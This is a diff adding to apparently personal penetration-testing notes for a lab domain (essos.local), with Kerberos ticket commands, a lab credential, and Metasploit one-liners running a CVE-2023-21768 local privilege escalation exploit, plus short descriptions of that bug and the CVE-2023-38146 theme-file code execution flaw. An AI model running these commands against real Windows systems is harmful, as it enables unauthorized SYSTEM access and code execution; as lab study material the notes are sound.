@@ -58,6 +58,16 @@ sudo apt install krb5-user
 dpkg-reconfigure krb5-config
 getTGT.py essos.local/khal.drogo:horse
 
+---
+msfconsole -q -x "search platform:windows type:exploit; exit"
+msfconsole -q -x "use exploit/windows/local/cve_2023_21768_afd_lpe; set SESSION 1; run; exit"
+
+CVE-2023-21768: This local privilege escalation exploit targets a vulnerability in the Windows Ancillary Function Driver for Winsock (afd.sys). It leverages a kernel write-where primitive to manipulate I/O ring structures, granting elevated privileges to NT AUTHORITY\SYSTEM. This exploit is effective on Windows 11 22H2 up to build 22621.963, prior to the January 2023 patches. 
+GITHUB.COM
+
+CVE-2023-38146: This arbitrary code execution vulnerability involves Windows 11 theme files. When an unpatched Windows 11 system loads a theme file referencing an msstyles file with a PACKME_VERSION of 999, it attempts to load an accompanying DLL ending in _vrf.dll. If this DLL is malicious and properly signed, it can lead to arbitrary code execution. 
+---
+
 export KRB5CCNAME=/workspace/khal.drogo.ccache 
 smbclient.py -k @braavos.essos.local
 
